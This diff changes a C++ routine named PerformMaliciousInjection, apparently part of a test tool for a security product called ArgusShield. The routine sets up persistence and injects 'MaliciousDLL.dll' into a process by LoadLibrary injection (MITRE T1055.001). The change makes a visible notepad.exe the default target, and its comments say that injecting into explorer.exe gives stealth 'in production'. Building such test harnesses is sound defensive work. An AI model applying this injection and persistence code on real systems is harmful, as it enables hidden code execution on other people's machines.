@@ -406,6 +406,9 @@ void PerformMaliciousInjection()
         LogActivity("Technique: LoadLibrary DLL Injection");
         LogActivity("MITRE ATT&CK: T1055.001");
         LogActivity("");
+        LogActivity("[MODE] Visible Mode - Spawns notepad.exe");
+        LogActivity("[INFO] For stealth mode, edit code to use FindExplorerProcess() first");
+        LogActivity("");
 
         // Step 0: Establish persistence mechanisms
         LogActivity("[STEP 0] Establishing persistence mechanisms...");
@@ -418,25 +421,27 @@ void PerformMaliciousInjection()
             LogActivity("[WARNING] Some persistence mechanisms failed");
         }
 
-        // Step 1: Find target process (explorer.exe - trusted process for stealth)
-        LogActivity("[STEP 1] Finding target process (explorer.exe)...");
-        spawnedTargetPID = FindExplorerProcess();
+        // Step 1: Spawn target process (notepad.exe for visibility)
+        // Note: For stealth in production, use FindExplorerProcess() instead
+        LogActivity("[STEP 1] Spawning target process (notepad.exe)...");
+        spawnedTargetPID = SpawnTargetProcess();
 
-        // Fallback to spawning notepad.exe if explorer not found
+        // Fallback: Try explorer.exe if notepad spawn fails
         if (spawnedTargetPID == 0)
         {
-            LogActivity("[INFO] Explorer not found, spawning notepad.exe as fallback...");
-            spawnedTargetPID = SpawnTargetProcess();
+            LogActivity("[INFO] Notepad spawn failed, trying explorer.exe...");
+            spawnedTargetPID = FindExplorerProcess();
         }
 
         if (spawnedTargetPID == 0)
         {
             LogActivity("[ERROR] Failed to find/spawn target process!");
+            LogActivity("[ERROR] Both notepad.exe spawn and explorer.exe search failed");
             injectionSuccessful = false;
             return;
         }
 
-        LogActivity("[SUCCESS] Target process found: PID " + std::to_string(spawnedTargetPID));
+        LogActivity("[SUCCESS] Target process acquired: PID " + std::to_string(spawnedTargetPID));
 
         // Step 2: Get DLL path
         LogActivity("[STEP 2] Resolving MaliciousDLL.dll path...");
@@ -466,11 +471,16 @@ void PerformMaliciousInjection()
             LogActivity("[SUCCESS] DLL INJECTION COMPLETED!");
             LogActivity("============================================");
             LogActivity("Check proof file: " + std::string(ARGUSSHIELD_LOG_FILE));
+            LogActivity("Check DLL activity: C:\\ArgusShield_dll_activity.txt");
+            LogActivity("");
+            LogActivity("[INFO] Notepad window should be visible with DLL injected");
             injectionSuccessful = true;
         }
         else
         {
             LogActivity("[ERROR] DLL injection failed");
+            LogActivity("[ERROR] Check if running with administrator privileges");
+            LogActivity("[ERROR] Ensure MaliciousDLL.dll is in the same folder");
             injectionSuccessful = false;
         }
     }
